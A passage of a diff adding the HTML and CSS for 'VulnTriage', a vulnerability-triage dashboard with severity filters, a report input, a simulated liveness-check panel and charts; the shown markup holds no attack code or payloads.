@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VulnTriage · Triage</title>
+<style>
+:root{
+  --bg:#070b14;--bg2:#0a0f1c;--panel:#0b1120;--panel2:#0e1526;--line:#1a2338;--line2:#24304a;
+  --text:#e6ebf5;--muted:#7d8aa5;--dim:#56627c;
+  --blue:#1f6fd1;--blue2:#3b8cff;--teal:#2fd4c8;--cyan:#38e1ff;--violet:#8b6cff;--mag:#c05cff;
+  --fire:#ff8a1f;--amber:#f5a623;--red:#ff4a5a;--green:#2bd67b;
+  --sans:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+  --mono:'JetBrains Mono',ui-monospace,'SFMono-Regular',Menlo,Consolas,monospace;
+}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--bg);color:var(--text);font:13px/1.45 var(--sans);-webkit-font-smoothing:antialiased}
+button{font-family:inherit}
+:focus-visible{outline:2px solid var(--cyan);outline-offset:2px}
+/* top bar */
+.top{display:flex;align-items:center;gap:18px;height:60px;padding:0 22px;border-bottom:1px solid var(--line);background:linear-gradient(#080d18,#070b14)}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:14px;white-space:nowrap}
+.brand svg{flex:none}
+.brand .crumb{color:var(--muted);font-weight:500}
+.search{flex:1;max-width:520px;display:flex;align-items:center;gap:10px;height:38px;padding:0 12px;border:1px solid var(--line2);border-radius:10px;background:#0b1222;color:var(--muted)}
+.search input{flex:1;background:transparent;border:0;outline:0;color:var(--text);font:13px var(--sans)}
+.kbd{font:11px var(--mono);color:var(--muted);border:1px solid var(--line2);border-radius:5px;padding:1px 6px}
+.sp{flex:1}
+.status{display:flex;align-items:center;gap:8px;color:var(--teal);font-weight:600;font-size:13px;background:transparent;border:0;cursor:pointer;padding:6px 8px;border-radius:8px}
+.status:hover{background:#0f1729}
+.status .d{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green)}
+.status.live{color:var(--cyan)} .status.live .d{background:var(--cyan);box-shadow:0 0 8px var(--cyan)}
+.icon{position:relative;width:34px;height:34px;display:grid;place-items:center;color:#c9d3e6;border-radius:8px;background:transparent;border:0;cursor:pointer}
+.icon:hover{background:#0f1729}
+.badge{position:absolute;top:2px;right:2px;min-width:16px;height:16px;padding:0 4px;border-radius:8px;background:var(--red);color:#fff;font:700 10px/16px var(--sans);text-align:center}
+.user{display:flex;align-items:center;gap:10px}
+.av{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;font-weight:700;font-size:13px;background:#13203a;border:1px solid #2a3c60;color:#cfe0ff}
+.user b{display:block;font-size:13px;font-weight:600}.user small{color:var(--muted);font-size:11.5px}
+/* tabs */
+.tabs{display:flex;gap:28px;padding:0 22px;border-bottom:1px solid var(--line);background:var(--bg)}
+.tab{background:none;border:0;color:var(--muted);padding:13px 2px 11px;font-size:13.5px;font-weight:500;cursor:pointer;border-bottom:2px solid transparent}
+.tab.on{color:var(--text);border-bottom-color:var(--text)}
+.tab:hover{color:var(--text)}
+/* filter row */
+.filters{display:flex;align-items:center;gap:8px;padding:12px 22px;flex-wrap:wrap}
+.fsearch{flex:1;min-width:220px;display:flex;align-items:center;gap:8px;height:34px;padding:0 10px;border:1px solid var(--line);border-radius:8px;background:var(--panel);color:var(--dim)}
+.fbtn{height:34px;padding:0 12px;border:1px solid var(--line);border-radius:8px;background:var(--panel);color:#c9d3e6;font-size:12.5px;display:flex;align-items:center;gap:8px;cursor:pointer;white-space:nowrap}
+.fbtn:hover{border-color:var(--line2)}
+.toggle{display:flex;border:1px solid var(--line2);border-radius:8px;overflow:hidden;height:34px}
+.toggle button{background:transparent;border:0;color:var(--muted);padding:0 16px;font:600 11px var(--sans);letter-spacing:.12em;cursor:pointer}
+.toggle button.on{background:#1b2a48;color:#cfe0ff}
+.runbtn{height:34px;padding:0 18px;border:0;border-radius:8px;font:600 13px var(--sans);color:#fff;cursor:pointer;background:linear-gradient(90deg,#ff7a18,#ff3d6e);box-shadow:0 0 18px rgba(255,100,40,.35)}
+.runbtn:disabled{opacity:.5;cursor:not-allowed}
+.keyin{display:none;height:34px;width:230px;padding:0 10px;border:1px solid var(--line2);border-radius:8px;background:var(--panel);color:var(--text);font:12px var(--mono)}
+.keyin.show{display:block}
+/* layout */
+.main{display:grid;grid-template-columns:minmax(0,1fr) 330px;gap:14px;padding:0 22px 26px}
+.stack{display:flex;flex-direction:column;gap:14px;min-width:0}
+.panel{background:linear-gradient(180deg,#0c1324,#0a1020);border:1px solid var(--line);border-radius:10px;padding:14px 16px;min-width:0;box-shadow:inset 0 1px 0 rgba(255,255,255,.025)}
+.ph{display:flex;align-items:baseline;gap:10px;margin-bottom:10px}
+.ph h2{margin:0;font-size:15px;font-weight:600;letter-spacing:-.01em}
+.ph .ts{font:500 10.5px var(--mono);color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
+.ph .r{margin-left:auto;color:var(--muted)}
+.fi{width:14px;height:14px;opacity:.7}
+.row3{display:grid;grid-template-columns:minmax(0,.95fr) minmax(0,1fr) minmax(0,1.25fr);gap:14px}
+.row4{display:grid;grid-template-columns:1fr 1fr 1.4fr;gap:14px}
+/* flow */
+.flow{position:relative;height:360px}
+.flow canvas{position:absolute;inset:0;width:100%;height:100%}
+.colhdr{position:absolute;top:0;font:500 11.5px var(--sans);color:#c9d3e6;padding:3px 8px;border-left:3px solid var(--teal);background:#111a2e;border-radius:3px;white-space:nowrap}
+/* fire chart */
+.fireWrap{display:grid;grid-template-columns:minmax(0,1fr) 170px;gap:12px}
+.fire{position:relative;height:210px}
+.fire canvas{position:absolute;inset:0;width:100%;height:100%}
+.legend{list-style:none;margin:0;padding:6px 0 0;font:12px/1.9 var(--mono)}
+.legend li{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+/* inputs */
+textarea,.inp{width:100%;background:#080e1b;color:var(--text);border:1px solid var(--line);border-radius:8px;padding:10px;font:12px/1.55 var(--mono);outline:none}
+textarea{height:170px;resize:vertical}
+textarea:focus,.inp:focus{border-color:#2d5ea8}
+.sbtn{background:#111a2e;border:1px solid var(--line2);color:#c9d3e6;border-radius:7px;padding:5px 10px;font-size:11.5px;cursor:pointer}
+.sbtn:hover{border-color:#36507d}
+.hint{color:var(--dim);font-size:11px;margin-top:6px}
+.field{margin-bottom:9px}
+.field label{display:flex;justify-content:space-between;font-size:11.5px;color:var(--muted);margin-bottom:4px}
+.field label b{font:500 11.5px var(--mono);color:var(--text)}
+input[type=range]{width:100%;-webkit-appearance:none;appearance:none;height:4px;border-radius:4px;background:linear-gradient(90deg,var(--teal),var(--violet),var(--fire));outline:none}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;border-radius:50%;background:#e6ebf5;border:2px solid #0b1120;box-shadow:0 0 0 1px #3b4f75;cursor:pointer}
+input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;background:#e6ebf5;border:2px solid #0b1120}
+.seg{display:inline-flex;border:1px solid var(--line2);border-radius:7px;overflow:hidden}
+.seg button{background:transparent;border:0;color:var(--muted);padding:5px 10px;font-size:11.5px;cursor:pointer}
+.seg button.on{background:#1b2a48;color:#cfe0ff}
+.chk{display:flex;align-items:center;gap:6px;font-size:11.5px;color:var(--muted);cursor:pointer}
+.verdict{margin-top:10px;display:grid;grid-template-columns:78px 1fr;gap:12px;align-items:center;padding:10px;border:1px solid var(--line);border-radius:8px;background:#080e1b}
+.verdict.fail{border-color:rgba(255,74,90,.5)} .verdict.pass{border-color:rgba(43,214,123,.35)} .verdict.skip{opacity:.55}
+.kv{display:grid;grid-template-columns:1fr auto;gap:1px 8px;font-size:11px}
+.kv span{color:var(--muted)} .kv b{font:500 11px var(--mono)}
+.pill{display:inline-flex;align-items:center;gap:5px;padding:2px 8px;border-radius:999px;font:600 10.5px var(--sans);letter-spacing:.05em;text-transform:uppercase}
+.pill.ok{color:var(--green);background:rgba(43,214,123,.1);border:1px solid rgba(43,214,123,.3)}
+.pill.no{color:#ff8a95;background:rgba(255,74,90,.1);border:1px solid rgba(255,74,90,.4)}
+.pill.mu{color:var(--muted);background:#111a2e;border:1px solid var(--line2)}
+.reason{grid-column:1/-1;font-size:11px;color:var(--muted)}
+.ring{position:relative;width:78px;height:78px}.ring svg{transform:rotate(-90deg)}
+.ring .c{position:absolute;inset:0;display:grid;place-items:center;text-align:center}
+.ring .c b{font:600 17px var(--mono);display:block}.ring .c small{font:500 9px var(--mono);color:var(--dim);letter-spacing:.1em}
+.tiers{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px}
+.tier{text-align:left;cursor:pointer;padding:9px;border-radius:8px;border:1px solid var(--line);background:#080e1b;color:var(--text)}
+.tier:hover{border-color:var(--line2)}
+.tier.on{border-color:var(--violet);background:linear-gradient(180deg,rgba(139,108,255,.16),rgba(139,108,255,.03));box-shadow:0 0 14px rgba(139,108,255,.25)}
+.tier .t{font-weight:600;text-transform:capitalize}.tier .s{font:500 10.5px var(--mono);color:var(--violet)}
+.tier code{display:block;font:9.5px/1.35 var(--mono);color:var(--dim);word-break:break-all;margin-top:4px}
+/* output */
+.empty{display:grid;place-items:center;height:300px;color:var(--dim);text-align:center}
+.oh{display:grid;grid-template-columns:120px 1fr;gap:14px;align-items:center}
+.gauge{position:relative;width:120px;height:120px}.gauge svg{transform:rotate(-90deg)}
+.gauge .c{position:absolute;inset:0;display:grid;place-items:center;text-align:center}
+.gauge .c b{font:700 30px/1 var(--sans);display:block}.gauge .c small{font:500 9.5px var(--mono);color:var(--dim);letter-spacing:.12em}
+.sev{display:inline-block;padding:3px 9px;border-radius:5px;font:700 10.5px var(--sans);letter-spacing:.12em;text-transform:uppercase}
+.chip{display:inline-block;margin-top:7px;padding:4px 8px;border-radius:6px;background:rgba(56,225,255,.08);border:1px solid rgba(56,225,255,.3);color:var(--cyan);font:500 11px var(--mono)}
+.chip.w{background:#111a2e;border-color:var(--line2);color:#c9d3e6;font-family:var(--sans);margin:0 4px 4px 0}
+.summary{font-size:12px;color:#c9d3e6;margin:7px 0 0}
+.sect{margin-top:12px}
+.sect h3{margin:0 0 6px;font:600 10px var(--sans);letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.steps{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:5px}
+.steps li{display:flex;gap:8px;padding:6px 8px;border:1px solid var(--line);border-radius:7px;background:#080e1b;font-size:11.8px;cursor:pointer;opacity:0;animation:in .4s forwards}
+.steps li .bx{flex:none;width:14px;height:14px;margin-top:2px;border-radius:4px;border:1.5px solid #3b4f75;display:grid;place-items:center;font-size:10px}
+.steps li.ck{opacity:.55;text-decoration:line-through}.steps li.ck .bx{background:var(--green);border-color:var(--green);color:#04210f}
+@keyframes in{to{opacity:1}}
+.meta{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.scale{display:flex;gap:4px}
+.scale i{flex:1;height:22px;border-radius:5px;border:1px solid var(--line);display:grid;place-items:center;font:500 10.5px var(--mono);font-style:normal;color:var(--dim)}
+.scale i.on{background:var(--blue);border-color:var(--blue2);color:#fff;box-shadow:0 0 10px rgba(59,140,255,.4)}
+pre{margin:0;max-height:200px;overflow:auto;padding:10px;border-radius:8px;background:#060a14;border:1px solid var(--line);font:11px/1.5 var(--mono);color:#b8c7e0}
+.jk{color:var(--amber)}.js{color:#7fe3b4}.jn{color:var(--cyan)}
+.banner{margin-bottom:10px;padding:7px 10px;border-radius:7px;font-size:11.5px}
+.banner.demo{background:rgba(245,166,35,.08);border:1px solid rgba(245,166,35,.3);color:#ffd08a}
+.banner.live{background:rgba(56,225,255,.08);border:1px solid rgba(56,225,255,.3);color:#aef0ff}
+.banner.err{background:rgba(255,74,90,.08);border:1px solid rgba(255,74,90,.4);color:#ffb0b8}
+/* sidebar */
+.stats{display:flex;gap:18px;justify-content:flex-end;text-align:right}
+.stats b{display:block;font:600 18px var(--sans)}.stats small{color:var(--blue2);font-size:11px}
+.stats .red b,.stats .red small{color:var(--red)}
+.spark{height:56px;margin-top:8px}
+.list{list-style:none;margin:8px 0 0;padding:0}
+.list li{display:flex;justify-content:space-between;gap:8px;padding:6px 0;font-size:12px;border-top:1px solid #121a2d}
+.list li span:last-child{font:500 11.5px var(--mono);color:var(--blue2)}
+.list li .bad{color:var(--red)!important}.list li .good{color:var(--green)!important}
+.bars{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:8px}
+.bars li{display:grid;grid-template-columns:minmax(0,1fr) 46% 26px;gap:8px;align-items:center;font-size:11.5px;color:#c9d3e6}
+.bars li .lb{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.bars .tr{height:12px;background:#0f1830;border-radius:2px;overflow:hidden}
+.bars .tr i{display:block;height:100%;background:linear-gradient(90deg,#1554a8,var(--blue2));transition:width .6s}
+.bars li em{font:500 10.5px var(--mono);font-style:normal;color:var(--muted);text-align:right}
+.donut{display:grid;grid-template-columns:120px 1fr;gap:12px;align-items:center}
+.dleg{list-style:none;margin:0;padding:0;font-size:11.5px}
+.dleg li{display:flex;align-items:center;gap:6px;padding:2px 0;color:#c9d3e6}
+.dleg i{width:8px;height:8px;border-radius:2px;display:inline-block}
+.dleg em{margin-left:auto;font:500 11px var(--mono);font-style:normal;color:var(--muted)}
+.tag{font:500 9.5px var(--mono);color:var(--amber);border:1px solid rgba(245,166,35,.35);border-radius:4px;padding:0 5px;margin-left:6px}
+.view{display:none}.view.on{display:block}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{text-align:left;padding:8px;border-bottom:1px solid var(--line)}th{color:var(--dim);font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:.08em}
+td code{font:11px var(--mono);color:#c9d3e6}
+
+.kpis{display:grid;grid-template-columns:repeat(6,1fr);border:1px solid var(--line);border-radius:10px;background:linear-gradient(180deg,#0c1324,#0a1020);overflow:hidden}
+.kpi{padding:12px 16px;border-right:1px solid var(--line)}.kpi:last-child{border-right:0}
+.kpi b{display:block;font:600 26px/1.15 var(--sans);letter-spacing:-.02em}.kpi small{color:var(--muted);font-size:11.5px}
+.kpi.hot{background:linear-gradient(180deg,rgba(255,138,31,.22),rgba(255,138,31,.06));box-shadow:inset 0 -2px 0 var(--fire)}.kpi.hot b{color:#ffb15c}
+.kpi.red b{color:var(--red)}
+.holo{position:relative;height:380px;border-radius:8px;overflow:hidden;background:radial-gradient(120% 90% at 50% 100%,#04202a 0%,#030812 55%,#01030a 100%)}
+.holo canvas{position:absolute;inset:0;width:100%;height:100%}
+.holo::after{content:"";position:absolute;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(120,255,240,.05) 0 1px,transparent 1px 3px);mix-blend-mode:screen;animation:flick 4s infinite steps(1)}
+@keyframes flick{0%,100%{opacity:1}47%{opacity:.75}48%{opacity:1}83%{opacity:.85}}
+.hud{position:absolute;font:500 10.5px var(--mono);color:#7ff6ea;letter-spacing:.08em;text-shadow:0 0 8px rgba(47,212,200,.8);pointer-events:none;white-space:nowrap}
+.hud b{color:#d9fffb;font-weight:600}
+.two{display:grid;grid-template-columns:1.2fr 1fr;gap:14px}
+.ribbon{position:relative;height:210px}.ribbon canvas{position:absolute;inset:0;width:100%;height:100%}
+.dense{font:11.5px var(--mono)}.dense td,.dense th{padding:6px 8px}.dense tr:hover td{background:#0f1729}
+@media (max-width:1080px){.kpis{grid-template-columns:repeat(3,1fr)}.two{grid-template-columns:1fr}}
+footer{color:var(--dim);font-size:11px;padding:0 22px 20px}
+@media (max-width:1280px){.row3{grid-template-columns:1fr 1fr}.row3>:last-child{grid-column:1/-1}}
+@media (max-width:1080px){.main{grid-template-columns:1fr}.row4{grid-template-columns:1fr 1fr}.row4>:last-child{grid-column:1/-1}.search{display:none}}
+@media (max-width:720px){.row3,.row4,.fireWrap{grid-template-columns:1fr}.user div{display:none}.flow{height:300px}.tabs{gap:16px;overflow-x:auto}}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+/* ---- v3 interactive additions (same visual language) ---- */
+.fsearch input{flex:1;background:transparent;border:0;outline:0;color:var(--text);font:12.5px var(--sans);min-width:0}
+select.fbtn{appearance:none;-webkit-appearance:none;font-family:inherit;outline:none}
+.rbar{display:flex;gap:6px;align-items:center;margin-bottom:8px;flex-wrap:wrap}
+.rbar select{flex:1;min-width:140px;height:28px;background:#080e1b;color:#c9d3e6;border:1px solid var(--line2);border-radius:7px;font:12px var(--sans);padding:0 8px}
+.holo{cursor:grab;touch-action:none}.holo.drag{cursor:grabbing}
+.hctl{position:absolute;right:16px;top:48px;display:flex;gap:6px;z-index:2}
+.hctl button{background:rgba(6,20,28,.7);border:1px solid rgba(127,246,234,.4);color:#7ff6ea;border-radius:6px;font:500 10.5px var(--mono);padding:3px 8px;cursor:pointer}
+.tip{position:fixed;z-index:60;pointer-events:none;max-width:280px;padding:7px 10px;border-radius:8px;background:rgba(8,14,27,.92);border:1px solid var(--line2);backdrop-filter:blur(8px);font:11.5px/1.45 var(--sans);color:#c9d3e6;box-shadow:0 8px 24px rgba(0,0,0,.5);display:none}
+.tip b{color:var(--text)}
+th.so{cursor:pointer;user-select:none}th.so:hover{color:#c9d3e6}th.so[aria-sort=ascending]::after{content:" ▲"}th.so[aria-sort=descending]::after{content:" ▼"}
+tr.rw{cursor:pointer}tr.rw:focus{outline:1px solid var(--cyan);outline-offset:-1px}
+.fchips{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.fchip{background:rgba(56,225,255,.08);border:1px solid rgba(56,225,255,.3);color:var(--cyan);border-radius:999px;font:500 10.5px var(--mono);padding:2px 8px;cursor:pointer}
+.dleg li,.bars li.clk{cursor:pointer;border-radius:4px}.dleg li:hover,.bars li.clk:hover{background:#0f1729}
+svg path.seg{cursor:pointer;transition:opacity .2s}svg path.seg:hover{opacity:1!important;filter:brightness(1.25)}
+.drawer{position:fixed;top:0;right:0;bottom:0;width:min(520px,94vw);z-index:50;background:linear-gradient(180deg,rgba(12,19,36,.96),rgba(10,16,32,.96));backdrop-filter:blur(14px);border-left:1px solid var(--line2);box-shadow:-20px 0 50px rgba(0,0,0,.5);transform:translateX(105%);transition:transform .25s;display:flex;flex-direction:column;padding:16px}
+.drawer.on{transform:none}.drawer pre{max-height:none;flex:1}
+.drawer .dh{display:flex;align-items:center;gap:8px;margin-bottom:10px}.drawer .dh h2{margin:0;font-size:15px;flex:1}
+.toasts{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);z-index:70;display:flex;flex-direction:column;gap:6px;align-items:center}
+.toast{padding:8px 14px;border-radius:8px;background:rgba(14,21,38,.95);border:1px solid var(--line2);color:#c9d3e6;font-size:12px;box-shadow:0 8px 24px rgba(0,0,0,.5);animation:in .2s forwards;opacity:0}
+.toast.ok{border-color:rgba(43,214,123,.5)}.toast.err{border-color:rgba(255,74,90,.6)}.toast.warn{border-color:rgba(245,166,35,.5)}
+#v-visibility .holo{height:560px}#v-visibility .flow{height:440px}
+.sgrid{display:grid;grid-template-columns:180px minmax(0,1fr);gap:10px 14px;align-items:center;margin-bottom:14px}
+.sgrid label{color:var(--muted);font-size:12px}
+.sgrid .inp{height:32px;padding:0 10px}
+.st{position:fixed;top:70px;left:50%;transform:translateX(-50%);z-index:80;padding:10px 16px;border-radius:8px;font:600 12px var(--mono);white-space:pre}
+.st.pass{background:#06261a;border:1px solid var(--green);color:var(--green)}.st.fail{background:#2a0a10;border:1px solid var(--red);color:#ff8a95}
+@media (max-width:1280px){.hctl{top:auto;bottom:44px}}
+</style>
+</head>
+<body>
+<header class="top">
+  <div class="brand"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ff8a1f" stroke-width="2"><path d="M12 2l8 3v6c0 5-3.5 9-8 11-4.5-2-8-6-8-11V5z"/><path d="M12 7c1.5 2 3 3 3 5a3 3 0 0 1-6 0c0-1 .5-2 1-2.5.3 1 1 1.5 1.5 1.5-.5-1.5 0-3 .5-4z" fill="#ff8a1f" stroke="none"/></svg>VulnTriage <span class="crumb">/ Triage</span></div>
+  <label class="search"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg><input id="gsearch" placeholder="Search reports, techniques, assets, or ask VulnTriage…" aria-label="Search"><span class="kbd">⌘ K</span></label>
+  <div class="sp"></div>
+  <button class="status" id="statusPill" title="Toggle Demo / Live"><span class="d"></span><span id="statusTxt">Demo mode</span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg></button>
+  <button class="icon" aria-label="Notifications"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 8a6 6 0 1 1 12 0c0 7 3 8 3 8H3s3-1 3-8"/><path d="M10 20a2 2 0 0 0 4 0"/></svg><span class="badge" id="bell">0</span></button>
+  <button class="icon" aria-label="Security"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 2l8 3v6c0 5-3.5 9-8 11-4.5-2-8-6-8-11V5z"/><path d="M9 12l2 2 4-4"/></svg></button>
+  <div class="user"><div class="av">LD</div><div><b>Leondrell</b><small>Security Engineer</small></div></div>
+</header>
+<nav class="tabs" role="tablist">
+  <button class="tab on" data-v="triage" role="tab">Triage</button>
+  <button class="tab" data-v="visibility" role="tab">Visibility</button>
+  <button class="tab" data-v="findings" role="tab">Findings</button>
+  <button class="tab" data-v="settings" role="tab">Settings</button>
+</nav>
+<div class="filters">
+  <label class="fsearch"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg><input id="fsearch" placeholder="Search this session" aria-label="Search this session"></label>
+  <select class="fbtn" id="exportSel" aria-label="Export session"><option value="">This session ▾</option><option value="json">Export JSON</option><option value="csv">Export CSV</option><option value="reset">Reset session</option></select>
+  <select class="fbtn" id="sevFilter" aria-label="Filter by severity"><option value="">≡ By Severity ▾</option><option value="critical">critical</option><option value="high">high</option><option value="medium">medium</option><option value="low">low</option><option value="informational">informational</option><option value="blocked">blocked</option></select>
+  <input class="keyin" id="apikey" type="password" placeholder="Nebius key v1.… (memory only)" autocomplete="off" aria-label="Nebius API key">
+  <div class="toggle" role="group" aria-label="Mode"><button id="mDemo" class="on">DEMO</button><button id="mLive">LIVE</button></div>
+  <button class="runbtn" id="runBtn">▶ Run triage</button>
+</div>
+<div class="main">
+<div class="stack">
+<section class="view on" id="v-triage"><div class="stack">
+  <div class="kpis" id="kpis"></div>
+  <div class="panel" id="pHolo">
+    <div class="ph"><h2>Live holographic display</h2><span class="ts">orbital view · triage events</span><span class="r ts" id="holoTs">● live</span></div>
+    <div class="holo" id="holoBox"><canvas id="holo" aria-label="Rotating holographic globe from the stratosphere with triage events"></canvas>
+      <div class="hud" style="left:16px;top:14px">ALT <b>32 km</b> · STRATOSPHERE<br>PROJ ORTHO · TILT <b>23.4°</b></div>
+      <div class="hud" style="right:16px;top:14px;text-align:right" id="hudLL">LAT — · LON —</div>
+      <div class="hctl"><button id="hPause" aria-label="Pause rotation">❚❚ pause</button><button id="hReset" aria-label="Reset view">⟲ reset</button></div>
+      <div class="hud" style="left:16px;bottom:14px" id="hudEv">EVENTS 0</div>
+      <div class="hud" style="right:16px;bottom:14px;text-align:right">HOLO-PROJ v2 · <b>VULNTRIAGE</b><br>locations are simulated · demo</div>
+    </div>
+  </div>
+  <div class="panel" id="pFlow">
+    <div class="ph"><h2>Triage pipeline</h2><span class="ts" id="flowTs">idle</span><span class="r"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 5h18l-7 8v6l-4-2v-4z"/></svg></span></div>
+    <div class="flow" id="flowBox"><canvas id="flow" tabindex="0" aria-label="Pipeline flow diagram"></canvas></div>
+  </div>
+  <div class="two"><div class="panel">
+    <div class="ph"><h2>AURA liveness signal</h2><span class="ts" id="fireTs">0 samples</span><span class="r"><svg class="fi" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 5h18l-7 8v6l-4-2v-4z"/></svg></span></div>
+    <div class="fireWrap"><div class="fire"><canvas id="fire" aria-label="AURA score history rendered as flames"></canvas></div><ul class="legend" id="fireLeg"></ul></div>
+  </div>
+  <div class="panel"><div class="ph"><h2>Signals triaged</h2><span class="ts">fused · glint · lip-sync ribbons</span></div><div class="ribbon"><canvas id="ribbon" aria-label="Ribbon line chart of AURA channel scores"></canvas></div></div></div>
+  <div class="row3">
+    <section class="panel">
+      <div class="ph"><h2>Report</h2><span class="ts">input</span><span class="r ts">⌘/Ctrl + Enter</span></div>
+      <div class="rbar"><select id="sampleSel" aria-label="Sample reports"></select><button class="sbtn" id="loadSample">Load</button><button class="sbtn" id="clearRep">Clear</button></div>
+      <textarea id="report" spellcheck="false" aria-label="Vulnerability report"></textarea>
+      <div class="hint" id="charcount"></div>
+      <div class="tiers" id="tiers" role="group" aria-label="Model tier"></div>
+    </section>
+    <section class="panel">
+      <div class="ph"><h2>AURA gate</h2><span class="ts">liveness</span><label class="chk r"><input type="checkbox" id="auraOn" checked> AURA on</label><input type="checkbox" id="skipGate" hidden></div>
+      <div id="backendBox" style="margin:0 0 10px;padding:8px 10px;border:1px dashed rgba(47,212,200,.35);border-radius:10px">
+        <div class="hint" style="margin:0 0 6px">Backend: <b id="beStat">checking…</b></div>
+        <label for="simKind" class="hint" style="margin:0">Silent scan source <b>(SIMULATED landmark sequence, server-side)</b></label>
+        <select class="inp" id="simKind" style="width:100%;margin-top:4px">
+          <optgroup label="Simulate live person"><option value="Live" selected>Live person · close</option><option value="LiveAudio">Live person · with audio</option><option value="LiveRange">Live person · range 1.5 m</option></optgroup>
+          <optgroup label="Simulate photo / replay / deepfake"><option value="PrintedStatic">Printed photo · static</option><option value="PrintedMoved">Printed photo · moved</option><option value="ScreenMoire">Screen replay · moiré</option><option value="ScreenFlicker">Screen replay · flicker</option><option value="ScreenRectGlint">Screen replay · rectangular glint</option><option value="ScreenDuplicated">Screen replay · duplicated frames</option><option value="DeepfakeDesync">Deepfake · AV desync</option><option value="DeepfakeSmooth">Deepfake · too smooth</option><option value="DeepfakeLight">Deepfake · light mismatch</option></optgroup>
+        </select>
+        <label class="chk" style="margin-top:6px"><input type="checkbox" id="consentChk" checked> I consent to a liveness-only scan (no storage, no identification)</label>
+        <div class="hint" id="chPhrase" style="margin:6px 0 0">Challenge: —</div>
+        <div class="hint" style="margin:4px 0 0">Real camera needs an upstream face-landmark detector (e.g. MediaPipe Face Mesh) posting frames to <code>/api/aura/scan</code>; not wired in this build. Sliders below = legacy offline gate.</div>
+      </div>
+      <div id="auraFields">
+        <div class="field"><label>Glint arc ratio <b id="v-glint"></b></label><input type="range" id="glint" min="0" max="1.2" step="0.01" value="0.52"></div>
+        <div class="field"><label>Eye width (px) <b id="v-eye"></b></label><input type="range" id="eye" min="0" max="300" step="1" value="120"></div>
+        <div class="field"><label>Mouth width (px) <b id="v-mouth"></b></label><input type="range" id="mouth" min="0" max="300" step="1" value="120"></div>
+        <div class="field"><label>Viseme match <b id="v-vis"></b></label><input type="range" id="vis" min="0" max="1" step="0.01" value="0.92"></div>
+        <div class="seg" role="group" aria-label="Distance"><button id="dClose" class="on">Close · 30 cm</button><button id="dRange">Range · 1.5 m</button></div>
+      </div>
+      <div class="verdict" id="verdict">
+        <div class="ring"><svg width="78" height="78"><circle cx="39" cy="39" r="33" stroke="#16203a" stroke-width="6" fill="none"/><circle id="fg" cx="39" cy="39" r="33" stroke="#2fd4c8" stroke-width="6" fill="none" stroke-linecap="round" stroke-dasharray="207.3" stroke-dashoffset="207.3" style="transition:stroke-dashoffset .4s"/></svg><div class="c"><div><b id="fusedTxt">—</b><small>FUSED</small></div></div></div>
+        <div><div style="margin-bottom:5px"><span class="pill" id="aPill">—</span></div>
+          <div class="kv"><span>Glint</span><b id="k-g"></b><span>Lip-sync</span><b id="k-l"></b><span>Tier</span><b id="k-t"></b><span>Weights g/l</span><b id="k-w"></b><span>Threshold</span><b>≥ 0.85</b></div></div>
+        <div class="reason" id="aReason"></div>
+      </div>
+    </section>
+    <section class="panel" aria-live="polite">
+      <div class="ph"><h2>Triage output</h2><span class="ts" id="outTs">—</span><span class="r" id="schemaPill"></span></div>
+      <div id="out"><div class="empty">Run a triage to see CVSS, ATT&amp;CK mapping and remediation.</div></div>
+    </section>
+  </div>
+  <div class="row4">
+    <div class="panel"><div class="ph"><h2>Severity mix</h2><span class="ts">session</span></div><div class="donut"><svg id="dSev" width="120" height="120" viewBox="0 0 120 120"></svg><ul class="dleg" id="lSev"></ul></div></div>
+    <div class="panel"><div class="ph"><h2>Tier mix</h2><span class="ts">session</span></div><div class="donut"><svg id="dTier" width="120" height="120" viewBox="0 0 120 120"></svg><ul class="dleg" id="lTier"></ul></div></div>
+    <div class="panel"><div class="ph"><h2>Affected assets</h2><span class="ts">latest run</span></div><ul class="bars" id="assetBars"><li style="color:var(--dim)">No run yet</li></ul></div>
+  </div>
+  <div class="panel"><div class="ph"><h2>Recent activity</h2><span class="ts">session triage runs · click a row</span><span class="fchips" id="fchips"></span></div><div style="overflow-x:auto"><table class="dense" id="actTbl"></table></div></div>
